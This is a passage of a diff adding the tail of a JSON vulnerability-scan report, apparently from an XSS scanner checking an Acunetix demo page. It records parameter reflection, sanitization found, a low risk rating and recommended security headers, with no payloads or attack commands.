+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&copy;2019\n  Acunetix Ltd \n</div> \n<br> \n<div styl...",
+            "reflection_type": "direct"
+          },
+          {
+            "framework": "angular",
+            "context": "framework_detection",
+            "reflection_type": "framework"
+          }
+        ],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": true,
+          "mechanisms": [
+            "html_encoding",
+            "tag_removal"
+          ]
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [
+            {
+              "source": "url_based",
+              "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+            }
+          ],
+          "risk_level": "low"
+        }
+      }
+    }
+  }
+}
